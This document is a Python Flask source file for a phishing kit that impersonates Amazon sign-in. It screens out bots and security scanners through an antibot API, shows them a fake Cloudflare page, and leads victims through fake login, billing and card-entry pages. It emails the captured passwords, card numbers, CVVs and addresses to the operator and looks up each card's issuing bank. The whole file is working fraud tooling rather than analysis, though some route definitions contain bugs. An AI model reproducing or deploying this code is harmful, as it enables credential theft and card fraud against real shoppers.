from flask import Flask, request, abort, render_template, redirect, url_for, make_response
from static.ipx import onetime
import config
import requests, json
import smtplib
from email.message import EmailMessage


app = Flask(__name__)


def save(s, i):
    f = open(s, 'a+')
    f.writelines(f'\n{i}')
    f.close()


def cekbin(ccn):
    s = requests.Session()
    req = s.get(f'https://lookup.binlist.net/{ccn}')
    sc = req.content
    js = json.loads(sc)
    return js


def send_mail(subject, message, from_email):
    server='localhost'
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = config.emails_result
    msg.set_content(message)
    server = smtplib.SMTP(server)
    server.send_message(msg)
    server.quit()


def antibot(ipx, ua):
    s = requests.Session()
    req = s.get(f'https://antibot.pw/api/v2-blockers?ip={ipx}&apikey=43e78258c4c7968d5d40af1e75bdfa5f&ua={ua}')
    sc = req.content
    js = json.loads(sc)
    return js



@app.route("/", methods=['GET', 'POST'] )
def index():
    ua = request.headers
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['country']
    full = f'\n{ipx} || {ua}'
    vis = f'\n{cn} || {ipx} || {ua}'
    if cek['is_bot'] == True:
        save('bot.txt', full)
        return render_template('cloudflare.html')
    else:
        if config.onetime_access == True:
            if ipx in 'onetime.txt':
                return redirect("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fpath%3D%252Fgp%252Fyourstore%252Fhome%26signIn%3D1%26useRedirectOnSuccess%3D1%26action%3Dsign-out%26ref_%3Dnav_AccountFlyout_signout&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0")
            else:
                save('visitor.txt', vis)
                return render_template('session.html')
        return render_template('session.html')



@app.route("/login", methods=['GET', 'POST'] )
def login():
    if request.method == 'POST':
        akses = request.form.get('akseskey')
        return render_template('login.html', page=akses)
    else:
        return render_template('cloudflare.html')

@app.route("/password", method=['GET', 'POST'])
def password():
    if request.method == 'POST':
        email = request.form.get('ap_email')
        page = request.args.get('session', default = 'signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Damazon%2Blogin%26adgrpid%3D79685717977%26gclid%3DEAIaIQobChMIqvyY9rjs_AIVDFpgCh3iDwLSEAAYASAAEgLkG_D_BwE%26hvadid%3D585359104713%26hvdev%3Dc%26hvlocphy%3D9119934%26hvnetw%3Dg%26hvqmt%3De%26hvrand%3D13950319226766353353%26hvtargid%3Dkwd-360364907677%26hydadcr%3D2745_13541852%26tag%3Dhydglogoo-20%26ref%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select')
        resp = make_response(render_template('signin.html', page=page, emails=email))
        resp.set_cookie('emails', email)
        return resp
    else:
        return render_template('cloudflare.html')


@app.route("/secure", method=['GET', 'POST'])
def secure():
    ua = request.headers
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['country']
    rn = cek['info']['ipinfo']['regionName']
    page = request.args.get('session', default = 'openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Damazon%2Blogin%26adgrpid%3D79685717977%26gclid%3DEAIaIQobChMIqvyY9rjs_AIVDFpgCh3iDwLSEAAYASAAEgLkG_D_BwE%26hvadid%3D585359104713%26hvdev%3Dc%26hvlocphy%3D9119934%26hvnetw%3Dg%26hvqmt%3De%26hvrand%3D13950319226766353353%26hvtargid%3Dkwd-360364907677%26hydadcr%3D2745_13541852%26tag%3Dhydglogoo-20%26ref%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select')
    if request.method == 'POST':
        user_agent = request.headers.get('User-Agent')
        user_agent = user_agent.lower()
        email = request.cookies.get('emails')
        passw = request.form.get('ap_password')
        sb = f'Login Amazon {cn} | {ipx}'
        frm = 'logins@python-loversz.net'
        message = f'''
        | Login Amazon
        ============================== 
        | email     = {email}
        | password  = {passw}
        ==============================
        | Info Details
        ===============================
        | ip        = {ipx}
        | Country   = {cn}
        | Region    = {rn}
        | user agent= {ua}
        '''
        send_mail(sb, message, frm)
        if "iphone" or "android" in user_agent:
            resp = make_response(render_template('verifymobile.html', page=page))
            return resp.set_cookie('contry', cn)
        else:
            resp = make_response(render_template('verifydesktop.html', page=page))
            return resp.set_cookie('contry', cn)
    else:
        return index
    

@app.route("/billing", method=['GET', 'POST'])
def billing():
    cn = request.cookies.get('contry')
    user_agent = request.headers.get('User-Agent')
    user_agent = user_agent.lower()
    if "iphone" or "android" in user_agent:
        return render_template('billingmobile.html')
    else:
        return render_template('billingdesktop.html')


@app.route("/card", method=['GET', 'POST'])
def card():
    if request.method == 'POST':
        cn = request.cookies.get('contry')
        fname = request.form.get('fullname')
        addr = request.form.get('address')
        ct = request.form.get('cityp')
        stt = request.form.get('region')
        zpcod = request.form.get('zipcode')
        phone = request.form.get('phone')
        user_agent = request.headers.get('User-Agent')
        user_agent = user_agent.lower()
        if "iphone" or "android" in user_agent:
            resp = make_response(render_template('cardmobile.html'))
            resp.set_cookie('fullname', fname)
            resp.set_cookie('address', addr)
            resp.set_cookie('city', ct)
            resp.set_cookie('state', stt)
            resp.set_cookie('zipcode', zpcod)
            resp.set_cookie('phone', phone)
            resp.set_cookie('contry', cn)
            return resp
        else:
            resp = make_response(render_template('carddesktop.html'))
            resp.set_cookie('fullname', fname)
            resp.set_cookie('address', addr)
            resp.set_cookie('city', ct)
            resp.set_cookie('state', stt)
            resp.set_cookie('zipcode', zpcod)
            resp.set_cookie('phone', phone)
            resp.set_cookie('contry', cn)
            return resp
    else:
        index



@app.route("/complete", method=['GET', 'POST'])
def complete():
    ipx = request.remote_addr
    ua = request.headers
    full = f'\n{ipx}'
    if request.method == 'POST':
        namecard = request.form.get('namecard')
        ccn = request.form.get('ccn')
        cvvv = request.form.get('cvv')
        expm = request.form.get('expmonth')
        expy = request.form.get('expyear')
        fname = request.cookies.get('fullname')
        addr = request.cookies.get('address')
        count = request.cookies.get('contry')
        ct = request.cookies.get('city')
        stt = request.cookies.get('state')
        zpcode = request.cookies.get('zipcode')
        phone = request.cookies.get('phone')
        bin = cekbin(ccn)
        schem = bin['scheme']
        type = bin['type']
        bank = bin['bank']['name']
        sb = f'CC {type} | {bank} | {ipx}'
        frm = 'pemulung@python-loversz.net'
        m = f'''
        + ======== result ======== +
        | Bin   = {bank}
        | type  = {schem} {type} 
        ============================== 
        | name on card  = {namecard}
        | card number   = {ccn}
        | expired card  = {expm}/{expy}
        | cvv           = {cvvv}
        ==============================
        | Billing Details
        ===============================
        | Full name = {fname}
        | address   = {addr}
        | city      = {ct}
        | region    = {stt}
        | zip code  = {zpcode}
        | phone     = {phone}
        | country   = {count}
        ===============================
        | Info Details
        ===============================
        | ip        = {ipx}
        | user agent= {ua}
        '''
        send_mail(sb, m, frm)
        user_agent = request.headers.get('User-Agent')
        user_agent = user_agent.lower()
        if "iphone" or "android" in user_agent:
            save('visitor.txt', full)
            onetime(m)
            return render_template('donemobile.html')
        else:
            onetime(m)
            save('visitor.txt', full)
            return render_template('donepc.html')
    else:
        index



if __name__ == "__main__":
    app.run(host='0.0.0.0')